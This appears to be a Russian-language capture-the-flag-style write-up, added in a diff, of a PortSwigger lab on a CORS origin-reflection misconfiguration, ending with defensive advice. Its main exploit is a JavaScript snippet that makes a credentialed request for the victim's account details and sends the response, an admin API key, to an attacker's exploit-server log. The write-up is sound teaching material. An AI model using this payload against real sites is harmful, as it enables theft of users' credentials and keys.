@@ -1,0 +1,51 @@
+# CORS PORTSWIGGER — Basic Origin Reflection Attack
+
+ **Категория:** Web
+> **Сложность:** Easy
+> **Уязвимость:** CORS Misconfiguration (Origin Reflection)
+
+---
+
+## Входные данные
+
+Дана CORS-уязвимость. Задача — с помощью JS-кода вытащить API-ключ администратора.
+
+---
+
+## Суть уязвимости
+
+Сервер отражает любой `Origin` обратно в `Access-Control-Allow-Origin` вместо проверки по белому списку, плюс стоит `Access-Control-Allow-Credentials: true`. Значит скрипт с чужого домена может сделать запрос с куками жертвы (`withCredentials = true`) и прочитать ответ.
+
+API-ключ отдаётся эндпоинтом `/accountDetails` (найден через DevTools → Network).
+
+---
+
+## Эксплуатация
+
+**1.** Пишем эксплойт:
+
+```html
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=' + this.responseText;
+    }
+</script>
+```
+
+**2.** Вставляем в Body на exploit-сервере → **Store**
+
+**3.** **Deliver exploit to victim**
+
+**4.** Смотрим **Access log** — там API-ключ администратора
+
+---
+
+## Способы защиты
+
+Настроить ACAO по белому списку доверенных доменов, не отражать `Origin` слепо; не сочетать wildcard/reflection с `Allow-Credentials: true`.
